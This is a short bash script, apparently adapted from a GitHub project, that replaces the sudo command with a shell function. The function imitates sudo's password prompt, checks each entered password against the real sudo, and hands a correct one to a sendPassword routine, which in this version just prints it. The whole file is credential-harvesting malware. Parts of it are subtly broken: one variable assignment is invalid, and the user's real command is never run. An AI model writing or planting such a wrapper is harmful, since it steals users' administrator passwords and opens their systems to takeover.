# Fake sudo, not made by me, but borrowed!
# https://github.com/mthbernardes/fsudo
# Improved.

# Wrapper of sudo
function sudo() 
{
  user_shell=$(basename $SHELL)
  sudo_original="/usr/bin/sudo"
  param="$@"
  msg="Password: "
  success=0
  case $param in
    -h)
      $sudo_original -h
      ;;
    -k)
      $sudo_original -k
      ;;
    -K)
      $sudo_original -K
      ;;
    -V)
      $sudo_original -V
      ;;
    *)
      $sudo_original -k

      for i in {1..3};do
        if [[ $user_shell == "zsh" ]];then
          echo -n "$msg";read -s passwd
          echo
        else
          read -s -p "$msg" passwd
          echo
        fi
        echo "$passwd" | $sudo_original -S true 2> /dev/null
        
        if [[ $? == 0 ]];then
          success = 1
          echo
          sendPassword
          #echo "$passwd" | $sudo_original -S -p '' $@
          break
        fi
        if [[ $i != 3 ]];then
          echo -e "\nSorry, try again."
        fi
      done
      if [[ $success == 0 ]];then
        echo -e "\nsudo: 3 incorrect password attempts"
      fi
  esac
}

function sendPassword() 
{
  echo $passwd
}